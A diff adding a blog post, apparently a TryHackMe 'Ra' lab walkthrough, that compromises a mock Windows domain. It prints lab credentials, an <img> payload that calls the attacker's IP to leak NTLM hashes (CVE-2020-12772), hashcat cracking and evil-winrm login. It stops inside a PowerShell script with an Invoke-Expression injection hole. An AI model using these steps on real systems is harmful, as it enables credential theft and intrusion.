@@ -1,0 +1,1193 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <meta http-equiv="cache-control" content="max-age=0" />
+    <meta http-equiv="cache-control" content="no-cache" />
+    <meta http-equiv="expires" content="0" />
+    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
+    <meta http-equiv="pragma" content="no-cache" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+
+    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
+    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />
+
+    <meta name="description" content="tryhackme: ra">
+
+    
+        <title>tryhackme: ra | ༧</title>
+    
+
+    
+    <link rel="stylesheet" type="text/css" href="/style.min.50e5dce6bdbdda9c021bb01730b34c1639e90db55e0fd1ed0f37771832d1ce47.css" media="all">
+  </head>
+
+  <body>
+        
+        <nav>
+          <ul class="menu">
+            
+                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
+            
+          </ul>
+        </nav>
+        
+
+
+
+<div id="single-header">
+  <h1>
+    tryhackme: ra
+  </h1>
+  <div id="single-meta">
+    
+    
+        <span class="datesub">jan 10, 2021 &nbsp;&nbsp; m. jan 29, 2024</span>
+      
+
+  </div>
+</div>
+
+
+
+
+<main><p>as i&rsquo;ve been studying and preparing for my next big certification, the eCPPT (certified professional penetration tester), i had to remind myself to try and keep my skills sharp. since the course material for the eCPPT goes deeply into the fundamentals of topics like assembly, social engineering, etc., i&rsquo;ve had to take time away from it to keep practicing all that i&rsquo;ve learned so far. &ldquo;ra&rdquo; happened to be the most challenging room i&rsquo;ve done until now, but i&rsquo;m sure there are more to come, that take even more skills into account.</p>
+<p>the story with the room is that there&rsquo;s a mega corporation called WindCorp, and they like to brag about the fact that they&rsquo;re &ldquo;unhackable&rdquo;. in this story, we&rsquo;re a hacker trying to make them eat their words, and we&rsquo;ll be exploiting a windows machine that we&rsquo;ve spotted.</p>
+<p>as usual, we get a target IP address: <code>10.10.75.59</code></p>
+<p>and again, we&rsquo;ll start off with an nmap scan (and save the results):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nmap -sC -sV -Pn -oN openports.txt 10.10.75.79
+</span></span></code></pre></div><p>i&rsquo;ll trim the fat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>53/tcp   open  domain              Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp   open  http                Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec        Microsoft Windows Kerberos <span style="color:#ff79c6">(</span>server time: 2021-10-27 18:06:06Z<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc               Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn         Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap                Microsoft Windows Active Directory LDAP <span style="color:#ff79c6">(</span>Domain: windcorp.thm0., Site: Default-First-Site-Name<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>443/tcp  open  ssl/http            Microsoft HTTPAPI httpd 2.0 <span style="color:#ff79c6">(</span>SSDP/UPnP<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp  open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp  open  ldapssl?
+</span></span><span style="display:flex;"><span>2179/tcp open  vmrdp?
+</span></span><span style="display:flex;"><span>3268/tcp open  ldap                Microsoft Windows Active Directory LDAP <span style="color:#ff79c6">(</span>Domain: windcorp.thm0., Site: Default-First-Site-Name<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl?
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server       Microsoft Terminal Services
+</span></span><span style="display:flex;"><span>5222/tcp open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
+</span></span><span style="display:flex;"><span>5269/tcp open  xmpp                Wildfire XMPP Client
+</span></span><span style="display:flex;"><span>7070/tcp open  http                Jetty 9.4.18.v20190429
+</span></span><span style="display:flex;"><span>7443/tcp open  ssl/http            Jetty 9.4.18.v20190429
+</span></span><span style="display:flex;"><span>7777/tcp open  socks5              <span style="color:#ff79c6">(</span>No authentication; connection failed<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>9090/tcp open  zeus-admin?
+</span></span><span style="display:flex;"><span>9091/tcp open  ssl/xmltec-xmlmail?
+</span></span></code></pre></div><p>we can see a bunch of services running across a variety of ports. the key here is to not be overwhelmed, and start small. some (or a lot) of these services could even just be rabbit holes waiting to be traversed.</p>
+<p>i modified the /etc/hosts file and added windcorp.thm (DNS domain name) and fire.windcorp.thm (DNS computer name).</p>
+<p>let&rsquo;s visit <a href="http://windcorp.thm"  target="_blank" rel="noreferrer nofollow">http://windcorp.thm</a>
+.</p>
+<p>the search bar on the site doesn&rsquo;t work, but the &ldquo;reset password&rdquo; link does.</p>
+<ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/resetpassword.PNG" alt="reset"  />
+</p>
+</li>
+</ul>
+<p>i have no idea how to fill in these fields, so i&rsquo;m going to continue digging around the site.</p>
+<p>scrolling down a bit, and we can see a list of employees:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-s" data-lang="s"><span style="display:flex;"><span>Antonietta Vidal
+</span></span><span style="display:flex;"><span>Britney Palmer
+</span></span><span style="display:flex;"><span>Brittany Cruz
+</span></span><span style="display:flex;"><span>Carla Meyer
+</span></span><span style="display:flex;"><span>Buse Candan
+</span></span><span style="display:flex;"><span>Edeltraut Daub
+</span></span><span style="display:flex;"><span>Edward Lewis
+</span></span><span style="display:flex;"><span>Emile Lavoie
+</span></span><span style="display:flex;"><span>Emile Henry
+</span></span><span style="display:flex;"><span>Emily Anderson
+</span></span><span style="display:flex;"><span>Hemmo Boschma
+</span></span><span style="display:flex;"><span>Isabella Hughes
+</span></span><span style="display:flex;"><span>Isra Saur
+</span></span><span style="display:flex;"><span>Jackson Vasquez
+</span></span><span style="display:flex;"><span>Jaqueline Dittmer
+</span></span><span style="display:flex;"><span>Emily Jensen
+</span></span><span style="display:flex;"><span>Lily Levesque
+</span></span><span style="display:flex;"><span>Kirk Uglas
+</span></span></code></pre></div><p>let&rsquo;s save these names to a file (users.txt), then break up the names so we can search the site&rsquo;s source to see if they pop in any form anywhere else.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat users.txt | tr -s <span style="color:#f1fa8c">&#39; &#39;</span> <span style="color:#f1fa8c">&#39;\n&#39;</span> &gt; userslist.txt
+</span></span></code></pre></div><p>the output (userslist.txt) now looks like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Antonietta
+</span></span><span style="display:flex;"><span>Vidal
+</span></span><span style="display:flex;"><span>Britney
+</span></span><span style="display:flex;"><span>Palmer
+</span></span><span style="display:flex;"><span>Brittany
+</span></span><span style="display:flex;"><span>Cruz
+</span></span><span style="display:flex;"><span>Carla
+</span></span><span style="display:flex;"><span>Meyer
+</span></span><span style="display:flex;"><span>Buse
+</span></span><span style="display:flex;"><span>Candan
+</span></span><span style="display:flex;"><span>Edeltraut
+</span></span><span style="display:flex;"><span>Daub
+</span></span><span style="display:flex;"><span>Edward
+</span></span><span style="display:flex;"><span>Lewis
+</span></span><span style="display:flex;"><span>Emile
+</span></span><span style="display:flex;"><span>Lavoie
+</span></span><span style="display:flex;"><span>Emile
+</span></span><span style="display:flex;"><span>Henry
+</span></span><span style="display:flex;"><span>Emily
+</span></span><span style="display:flex;"><span>Anderson
+</span></span><span style="display:flex;"><span>Hemmo
+</span></span><span style="display:flex;"><span>Boschma
+</span></span><span style="display:flex;"><span>Isabella
+</span></span><span style="display:flex;"><span>Hughes
+</span></span><span style="display:flex;"><span>Isra
+</span></span><span style="display:flex;"><span>Saur
+</span></span><span style="display:flex;"><span>Jackson
+</span></span><span style="display:flex;"><span>Vasquez
+</span></span><span style="display:flex;"><span>Jaqueline
+</span></span><span style="display:flex;"><span>Dittmer
+</span></span><span style="display:flex;"><span>Emily
+</span></span><span style="display:flex;"><span>Jensen
+</span></span><span style="display:flex;"><span>Lily
+</span></span><span style="display:flex;"><span>Levesque
+</span></span><span style="display:flex;"><span>Kirk
+</span></span><span style="display:flex;"><span>Uglas
+</span></span></code></pre></div><p>now let&rsquo;s feed this list to a <code>curl</code> command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>curl http://windcorp.thm | egrep -i -f userslist.txt
+</span></span></code></pre></div><ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/curlingusers.PNG" alt="curlingusers"  />
+</p>
+</li>
+</ul>
+<p>we can see the names pop up in some email addresses, but towards the end we can see the names pop up in what appear to be some images. the image that caught my eye was <strong>lilyleAndSparky.jpg</strong>.</p>
+<ul>
+<li>
+<p><p class="imgp">
+  <img loading="lazy" src="/employees.PNG" alt="employees"  />
+</p>
+</p>
+</li>
+<li>
+<p><p class="imgp">
+  <img loading="lazy" src="/employees2.PNG" alt="employees2"  />
+</p>
+</p>
+</li>
+</ul>
+<p>could this be the key to resetting the password? we have a username: lilyle (lily levesque) and the name &ldquo;sparky&rdquo; (probably her dog&rsquo;s name). one of the security questions was &ldquo;what is/was your favorite pets name?&rdquo;. let&rsquo;s try it.</p>
+<ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/lilylepassword.PNG" alt="lilylepassword"  />
+</p>
+</li>
+</ul>
+<p>wow, it actually worked. which is good, because if it didn&rsquo;t i would really not know what to do next and would have to rethink my whole attack.</p>
+<p>armed with these credentials (lilyle:ChangeMe#1234), let&rsquo;s enumerate the SMB shares and try to log into one of them.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>smbclient -L 10.10.75.59 -U lilyle
+</span></span></code></pre></div><p>enter the password when prompted.</p>
+<p>we can also use:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>smbmap -u lilyle -p ChangeMe#1234 -H windcorp.thm
+</span></span></code></pre></div><ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/smbenumeration.PNG" alt="smbenumeration"  />
+</p>
+</li>
+</ul>
+<p>let&rsquo;s try to login to the &ldquo;Shared&rdquo; share.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>smbclient <span style="color:#f1fa8c">\\\\</span>10.10.75.59<span style="color:#f1fa8c">\\</span>Shared -U lilyle --password ChangeMe#1234
+</span></span></code></pre></div><ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/smblogin&#43;flag1.PNG" alt="smblogin"  />
+</p>
+</li>
+</ul>
+<p>we can see there&rsquo;s a flag stored right there, along with installers for an application called &ldquo;spark&rdquo;.</p>
+<p>let&rsquo;s download both the flag, and the .deb installer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>get <span style="color:#f1fa8c">&#34;Flag 1.txt&#34;</span>
+</span></span><span style="display:flex;"><span>get spark_2_8_3.deb
+</span></span></code></pre></div><p>if the installer is too big for your network connection, the connection will timeout. in that case, you can try <code>curl</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -u <span style="color:#f1fa8c">&#34;windcorp.thm\lilyle:ChangeMe#1234&#34;</span> smb://windcorp.thm/Shared/spark_2_8_3.deb
+</span></span></code></pre></div><p>this didn&rsquo;t work for me either, so i tried to download and install the tarball package (spark_2_8_3.tar.gz). when that also didn&rsquo;t work, i ended up finding an installer on the internet and just downloaded then installed that. the version difference in this case didn&rsquo;t matter, but in a real-life scenario, versions are often very important, and some exploits don&rsquo;t work with later versions of applications.</p>
+<p>once you&rsquo;ve downloaded spark, try to get some info on the package.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>dpkg-deb -I spark_2_8_3.deb
+</span></span></code></pre></div><ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/sparkinfo.PNG" alt="sparkinfo"  />
+</p>
+</li>
+</ul>
+<p>it&rsquo;s a &ldquo;cross-platform real-time collaboration client optimized for business and organizations&rdquo;.</p>
+<p>basically, it&rsquo;s an IM client or chat app.</p>
+<p>when it&rsquo;s installed, try to use the credentials lilyle:ChangeMe#1234 to log in.</p>
+<p>the login fails, because the app wasn&rsquo;t able to verify the certificate. no matter, because we can go into the advanced settings of the app and select the option &ldquo;accept all certificates&rdquo; and disable &ldquo;certificate hostname verification&rdquo;.</p>
+<p>now, we can log in.</p>
+<p>we see there&rsquo;s a conference room, but no one is in it. the app looks pretty empty.</p>
+<ul>
+<li>
+<p><p class="imgp">
+  <img loading="lazy" src="/spark_room.PNG" alt="spark_room"  />
+</p>
+</p>
+</li>
+<li>
+<p><p class="imgp">
+  <img loading="lazy" src="/sparkempty.PNG" alt="sparkempty"  />
+</p>
+</p>
+</li>
+</ul>
+<p>when dealing with apps like this, it&rsquo;s good practice to start searching vuln databases to see if any exploit exists. a good place to check is <a href="https://attackerkb.com/"  target="_blank" rel="noreferrer nofollow">https://attackerkb.com/</a>
+</p>
+<p>searching for &ldquo;spark exploits&rdquo; leads us to CVE-2020-12772.</p>
+<ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/attackerkb.PNG" alt="attackerkb"  />
+</p>
+</li>
+</ul>
+<p>in a nutshell, this exploit allows us to send an &ldquo;image&rdquo; to a contact, but the SRC attribute of the image will refer our IP address. when the contact clicks this link, their hashes will be sent with the HTTP request. to receive this data, we&rsquo;ll need to run Responder.py.</p>
+<p>now we need to select a target. if you remember, the site had a list of technical staff and their status (online/offline). going back to the site, we see that the user &ldquo;buse&rdquo; is online. let&rsquo;s target them.</p>
+<p>first, run responder:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>/opt/Responder/Responder.py
+</span></span></code></pre></div><p>now, send the following &ldquo;image&rdquo; to buse:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>&lt;img <span style="color:#8be9fd;font-style:italic">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://10.9.6.194/bilal.jpg&gt;
+</span></span></span></code></pre></div><p>wait for buse to click the link&hellip;</p>
+<ul>
+<li>
+<p><p class="imgp">
+  <img loading="lazy" src="/responder.PNG" alt="responder"  />
+</p>
+</p>
+</li>
+<li>
+<p><p class="imgp">
+  <img loading="lazy" src="/sparkexploit.PNG" alt="sparkexploit"  />
+</p>
+</p>
+</li>
+</ul>
+<p>we receive a hash, in the NTLMv2 format. hopefully, we can crack it with hashcat (and rockyou.txt):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>hashcat.exe -a <span style="color:#bd93f9">0</span> -m <span style="color:#bd93f9">5600</span> <span style="color:#f1fa8c">&#34;buse::WINDCORP:1122334455667788:96320659CCC8CCD0C23852F82AA669C8:0101000000000000792F24210DCCD701CB9891E68DB963FB000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000B25F9F074A7F2B076C71892C3D7F9B988260CA42BCBEB4E1863C7810B3FF276D0A00100000000000000000000000000000000000090000000000000000000000&#34;</span> C:<span style="color:#f1fa8c">\r</span>ockyou.txt
+</span></span></code></pre></div><p>upon a successful crack, we&rsquo;ll get the password <code>uzunLM+3131</code>. great- ! now we have another set of credentials &ndash; buse:uzunLM+3131</p>
+<p>note: i do recommend saving found/cracked credentials in a text file. that way we&rsquo;re not constantly scrolling through terminal trying to find them.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;buse:uzunLM+3131&#34;</span> &gt; creds.txt
+</span></span></code></pre></div><p>now we get to use one of my favourite tools ever: <a href="https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/"  target="_blank" rel="noreferrer nofollow">evil winrm</a>
+. if you don&rsquo;t know, evil winrm is basically the go-to tool, sometimes used by sysadmins but mostly by hackers, to remotely access a windows machine. it&rsquo;s extremely useful in the post-exploitation phase.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>evil-winrm -u buse -p uzunLM+3131 -i windcorp.thm
+</span></span></code></pre></div><p>this will log us in as buse, and upon poking around, you&rsquo;ll locate the 2nd flag.</p>
+<p>what&rsquo;s more interesting though, and which proves to eventually be vital in privilege escalation, is a folder in C:\ that contains a powershell script and its log.</p>
+<ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/busescripts.PNG" alt="busescripts"  />
+</p>
+</li>
+</ul>
+<p>the code for the checkservers.ps1 script is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#6272a4"># reset the lists of hosts prior to looping</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$OutageHosts</span> = $Null
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># specify the time you want email notifications resent for hosts that are down</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$EmailTimeOut</span> = <span style="color:#bd93f9">30</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># specify the time you want to cycle through your host lists.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$SleepTimeOut</span> = <span style="color:#bd93f9">45</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># specify the maximum hosts that can be down before the script is aborted</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$MaxOutageCount</span> = <span style="color:#bd93f9">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># specify who gets notified</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$notificationto</span> = <span style="color:#f1fa8c">&#34;brittanycr@windcorp.thm&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># specify where the notifications come from</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$notificationfrom</span> = <span style="color:#f1fa8c">&#34;admin@windcorp.thm&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># specify the SMTP server</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$smtpserver</span> = <span style="color:#f1fa8c">&#34;relay.windcorp.thm&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># start looping here</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">Do</span>{
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$available</span> = $Null
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$notavailable</span> = $Null
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Write-Host</span> (<span style="color:#8be9fd;font-style:italic">Get-Date</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Read the File with the Hosts every cycle, this way to can add/remove hosts</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># from the list without touching the script/scheduled task,</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># also hash/comment (#) out any hosts that are going for maintenance or are down.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">get-content</span> C:\Users\brittanycr\hosts.txt | <span style="color:#8be9fd;font-style:italic">Where-Object</span> {!(<span style="color:#8be9fd;font-style:italic">$_</span> <span style="color:#ff79c6">-match</span> <span style="color:#f1fa8c">&#34;#&#34;</span>)} |
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">ForEach-Object</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$p</span> = <span style="color:#f1fa8c">&#34;Test-Connection -ComputerName </span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#f1fa8c"> -Count 1 -ea silentlycontinue&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">Invoke-Expression</span> <span style="color:#8be9fd;font-style:italic">$p</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span>(<span style="color:#8be9fd;font-style:italic">$p</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>     <span style="color:#6272a4"># if the Host is available then just write it to the screen</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#8be9fd;font-style:italic">write-host</span> <span style="color:#f1fa8c">&#34;Available host ---&gt; &#34;</span><span style="color:#8be9fd;font-style:italic">$_</span> -BackgroundColor Green -ForegroundColor White
+</span></span><span style="display:flex;"><span>     [Array]<span style="color:#8be9fd;font-style:italic">$available</span> += <span style="color:#8be9fd;font-style:italic">$_</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>     <span style="color:#6272a4"># If the host is unavailable, give a warning to screen</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#8be9fd;font-style:italic">write-host</span> <span style="color:#f1fa8c">&#34;Unavailable host ------------&gt; &#34;</span><span style="color:#8be9fd;font-style:italic">$_</span> -BackgroundColor Magenta -ForegroundColor White
+</span></span><span style="display:flex;"><span>     <span style="color:#8be9fd;font-style:italic">$p</span> = <span style="color:#8be9fd;font-style:italic">Test-Connection</span> -ComputerName <span style="color:#8be9fd;font-style:italic">$_</span> -Count <span style="color:#bd93f9">1</span> -ea silentlycontinue
+</span></span><span style="display:flex;"><span>     <span style="color:#ff79c6">if</span>(!(<span style="color:#8be9fd;font-style:italic">$p</span>))
+</span></span><span style="display:flex;"><span>       {
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># If the host is still unavailable for 4 full pings, write error and send email</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">write-host</span> <span style="color:#f1fa8c">&#34;Unavailable host ------------&gt; &#34;</span><span style="color:#8be9fd;font-style:italic">$_</span> -BackgroundColor Red -ForegroundColor White
+</span></span><span style="display:flex;"><span>        [Array]<span style="color:#8be9fd;font-style:italic">$notavailable</span> += <span style="color:#8be9fd;font-style:italic">$_</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$OutageHosts</span> <span style="color:#ff79c6">-ne</span> $Null)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (!<span style="color:#8be9fd;font-style:italic">$OutageHosts</span>.ContainsKey(<span style="color:#8be9fd;font-style:italic">$_</span>))
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                 <span style="color:#6272a4"># First time down add to the list and send email</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#8be9fd;font-style:italic">Write-Host</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#f1fa8c"> Is not in the OutageHosts list, first time down&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#8be9fd;font-style:italic">$OutageHosts</span>.Add(<span style="color:#8be9fd;font-style:italic">$_</span>,(<span style="color:#8be9fd;font-style:italic">get-date</span>))
+</span></span><span style="display:flex;"><span>                 <span style="color:#8be9fd;font-style:italic">$Now</span> = <span style="color:#8be9fd;font-style:italic">Get-date</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#8be9fd;font-style:italic">$Body</span> = <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#f1fa8c"> has not responded for 5 pings at </span><span style="color:#8be9fd;font-style:italic">$Now</span><span style="color:#f1fa8c">&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#8be9fd;font-style:italic">Send-MailMessage</span> -Body <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$body</span><span style="color:#f1fa8c">&#34;</span> -to <span style="color:#8be9fd;font-style:italic">$notificationto</span> -from <span style="color:#8be9fd;font-style:italic">$notificationfrom</span> `
+</span></span><span style="display:flex;"><span>                  -Subject <span style="color:#f1fa8c">&#34;Host </span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#f1fa8c"> is down&#34;</span> -SmtpServer <span style="color:#8be9fd;font-style:italic">$smtpserver</span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                    <span style="color:#6272a4"># If the host is in the list do nothing for 1 hour and then remove from the list.</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#8be9fd;font-style:italic">Write-Host</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#f1fa8c"> Is in the OutageHosts list&#34;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">if</span> (((<span style="color:#8be9fd;font-style:italic">Get-Date</span>) - <span style="color:#8be9fd;font-style:italic">$OutageHosts</span>.Item(<span style="color:#8be9fd;font-style:italic">$_</span>)).TotalMinutes <span style="color:#ff79c6">-gt</span> <span style="color:#8be9fd;font-style:italic">$EmailTimeOut</span>)
+</span></span><span style="display:flex;"><span>                    {<span style="color:#8be9fd;font-style:italic">$OutageHosts</span>.Remove(<span style="color:#8be9fd;font-style:italic">$_</span>)}
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#6272a4"># First time down create the list and send email</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">Write-Host</span> <span style="color:#f1fa8c">&#34;Adding </span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#f1fa8c"> to OutageHosts.&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">$OutageHosts</span> = @{<span style="color:#8be9fd;font-style:italic">$_</span>=(<span style="color:#8be9fd;font-style:italic">get-date</span>)}
